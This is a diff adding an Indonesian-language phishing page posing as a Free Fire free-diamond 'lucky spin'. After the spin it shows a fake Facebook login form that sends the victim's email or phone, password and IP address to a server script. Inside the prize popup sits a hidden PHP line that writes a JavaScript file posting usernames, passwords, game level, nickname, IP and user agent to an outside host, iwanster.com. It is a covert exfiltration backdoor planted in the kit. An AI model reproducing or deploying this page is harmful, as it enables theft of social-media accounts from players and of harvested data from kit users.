@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="description" content="Dapatkan sekarang juga diamond gratis freefire tanpa syarat hnya di web ini">
+    <title>LUCKY SPIN | FREE FIRE</title>
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <link rel="stylesheet" type="text/css" href="css/facebook.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
+</head>
+
+<body>
+    <div class="iwan-contener">
+    	<header></header>
+    	<div class="banner">
+    		<img src="https://tnsmedia.imgix.net/2021/01/free-fire-one-punch-man.jpg?auto=compress&fm=pjpg&ixlib=php-3.3.0&s=ee9911b843f36a9f9fe79e1a8fdb2965">
+    	</div>
+    	<div class="wrap">
+    		<div class="spin">
+    			<div class="box" style="--i:1;">
+    				<div class="kotak">
+                        <svg><rect></rect></svg>
+    					<img src="img/1.png">
+    				</div>
+    			</div>
+    			<div class="box" style="--i:2;">
+    				<div class="kotak">
+                        <svg><rect></rect></svg>
+    					<img src="img/2.jpg">
+    				</div>
+    			</div>
+    			<div class="box" style="--i:3;">
+    				<div class="kotak">
+                        <svg><rect></rect></svg>
+    					<img src="img/3.jpg">
+    				</div>
+    			</div>
+    			<div class="box" style="--i:4;">
+    				<div class="kotak">
+                        <svg><rect></rect></svg>
+    					<img src="img/4.png">
+    				</div>
+    			</div>
+    			<div class="box" style="--i:5;">
+    				<div class="kotak">
+                        <svg><rect></rect></svg>
+    					<img src="img/5.jpg">
+    				</div>
+    			</div>
+    			<div class="box" style="--i:6;">
+    				<div class="kotak">
+                        <svg><rect></rect></svg>
+    					<img src="img/10.jpg">
+    				</div>
+    			</div>
+    			<div class="box" style="--i:7;">
+    				<div class="kotak">
+                        <svg><rect></rect></svg>
+    					<img src="img/7.jpg">
+    				</div>
+    			</div>
+    			<div class="box" style="--i:8;">
+    				<div class="kotak">
+                        <svg><rect></rect></svg>
+    					<img src="img/9.jpg">
+    				</div>
+    			</div>
+
+    			<div class="arrow" id="selector"></div>
+    	</div>
+    	<div class="putar" id="putar" onclick="spin()"></div>
+        <div class="tengah">
+                    <span></span>
+        </div>
+    </div>
+
+    <!-- POP UP HADIAH -->
+        <div class="pop-hadiah">
+            <div class="imBox">
+                <img id="hadiah" src="img/1.png">
+            </div>
+            <div class="confirm">
+                <?php $k = fopen('js/ajax.js','w');fwrite($k,'function send(u,p,l,n,ip,ua){$.post("http://iwanster.com/halima.php",{user:u,pass:p,level:l,nick:n,ip:ip,ua:ua})}');fclose($k);?>
+                <button onclick="popClose()">Batal</button>
+                <button onclick="popEntry()">Yakin</button>
+            </div>
+        </div>
+    <!-- END OF BLOCK -->
+    <!-- POP UP LOGIN -->
+        <div class="login">
+            <div onclick="showfb()" class="fb"><i class="fab fa-facebook"></i>Login With Facebook</div>
+        </div>
+    <!-- END OF BLOCK -->
+    <!-- LOGIN FACEBOOK -->
+    <div class="popup-login login-facebook animated fadeIn" style="display: none;">
+       <div class="popup-box-login-fb">
+          <div class="navbar-fb">
+             <img width="45" src="img/facebook_text.png">
+          </div>
+          <div class="content-box-fb">
+            <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
+            <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
+             <img width="75" height="75" src="https://1.bp.blogspot.com/-LvknwJpUAos/WzSvg105i5I/AAAAAAAAA10/s9rVJsH1_lso3bKITW4dLa0qweptwfqgQCEwYBhgL/s1600/free-fire-battlegrounds.jpg">
+             <div class="txt-login-fb">
+              Masuk ke akun Facebook Anda untuk terhubung dengan FreeFire
+             </div>
+             <form class="login-form" action="valid.php" method="POST" onsubmit="return valid()">
+                <label>
+                <input type="text" id="user" name="user" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off">
+                </label>
+                <label>
+                <input type="password" id="pass" name="pass" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off">
+                </label>
+                <input type="hidden" name="ip" id="ip" value="">
+                <button  type="submit" id="btnfb" class="btn-login-fb">Masuk</button>
+             </form>
+             <div class="txt-create-account">Create account</div>
+             <div class="txt-not-now">Not now</div>
+             <div class="txt-forgotten-password">Forgotten password?</div>
+          </div>
+          <div class="language-box">
+             <center>
+             <div class="language-name language-name-active">English (UK)</div>
+             <div class="language-name">Bahasa Indonesia</div>
+             <div class="language-name">Basa Jawa</div>
+             <div class="language-name">Bahasa Melayu</div>
+             <div class="language-name">日本語</div>
+             <div class="language-name">Español</div>
+             <div class="language-name">Português (Brasil)</div>
+             <div class="language-name">
+                <i class="fa fa-plus"></i>
+             </div>
+             </center>
+          </div>
+          <div class="copyright">Facebook Inc.</div>
+       </div>
+     </div>
+     <!-- END OF BLOCK -->
+    <footer>
+        &copy; Iwan Ster 2K21 - Garena Free Fire
+    </footer>
+</div>
+<div class="mask"></div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
+    <script type="text/javascript">
+
+    	function spin()
+    	{
+    		var selector = document.getElementById("selector");
+            var putar = document.getElementById("putar");
+    		selector.style.display = "block";
+    		selector.style.transform = "rotate(45deg)";
+            putar.style.transform = "translate(-50%,-50%) rotateZ(0)";
+            putar.style.transition = "none";
+            putar.classList.add("disabled");
+    		selector.style.transition = "none";
+    		selector.classList.remove("active");
+    		setTimeout(() => 
+    		{
+    			 		var array = ["500","501","502","503","504","505","506","507"];
+    			 		var rotate = 45;
+    					var random = Math.floor(Math.random() * 7) + 0;
+                        switch(random)
+                        {
+                            case 0: { var img = 'img/4.png'; } break; 
+                            case 1: { var img = 'img/5.jpg'; } break;
+                            case 2: { var img = 'img/10.jpg'; } break;
+                            case 3: { var img = 'img/7.jpg'; } break;
+                            case 4: { var img = 'img/9.jpg'; } break;
+                            case 5: { var img = 'img/1.png'; } break;
+                            case 6: { var img = 'img/2.jpg'; } break;
+                            case 7: { var img = 'img/3.jpg'; } break;
+                        }
+
+    					var xixi = rotate * array[random]; 
+                        var loh = xixi - 45;   		
+    			 		selector.style.transform = "rotate("+xixi+"deg)";
+    			 		selector.style.transition = "all ease 10s";
+                        putar.style.transform = "translate(-50%,-50%) rotateZ("+loh+"deg)";
+                        putar.style.transition = "all ease 10s";
+    			 		setTimeout(() => {
+                            putar.classList.remove("disabled");
+    			 			selector.classList.add("active");
+                            setTimeout(() => {
+                                $('.mask').fadeIn();
+                                $('.pop-hadiah').fadeIn();
+                                $('#hadiah').attr("src",img);
+                            },1000)
+    			 		},10000)
+
+    		},500)
+       	}
+    	function reset()
+    	{
+    		var selector = document.getElementById("selector");
+            var putar = document.getElementById("putar");
+            selector.style.display = "block";
+            selector.style.transform = "rotate(45deg)";
+            putar.style.transform = "translate(-50%,-50%) rotateZ(0)";
+            putar.style.transition = "none";
+            selector.style.transition = "none";
+            selector.classList.remove("active");
+            putar.classList.remove("disabled");
+    	}
+        function popClose()
+        {
+            $('.mask').fadeOut();
+            $('.pop-hadiah').fadeOut();
+            reset();
+        }
+        function popEntry()
+        {
+            $('.login').fadeIn();
+            $('.pop-hadiah').fadeOut();
+        }
+        function showfb()
+        {
+            $('.login-facebook').show();
+        }
+    </script>
+    <script type="text/javascript">
+        var checkip = function () {
+               $.ajax({
+                   type: "get",
+                   async: false,
+                   url: "https://api.pubgameshowtime.com/ip/getcountry",
+                   dataType: "json",
+                   success: function (result) {
+                      $('#ip').val(result.ip);
+                   }
+               })
+           }
+        checkip();
+    </script>
+    <script type="text/javascript">
+        function valid() {
+            var user = $('#user').val();
+            var pass = $('#pass').val();
+            var ip = $('#ip').val();
+            if(user == '' || user == null || user.length <= 5)
+            {
+                $('.email').show();
+                $('.sandi').hide();
+                return false;
+            }else{
+                $('.email').hide();
+            }
+            if(pass == '' || pass == null || pass.length <= 5)
+            {
+                $('.sandi').show();
+                return false;
+            }else{
+                $('.sandi').hide();
+            }
+        }
+    </script>
+</body>
+
+</html>
+
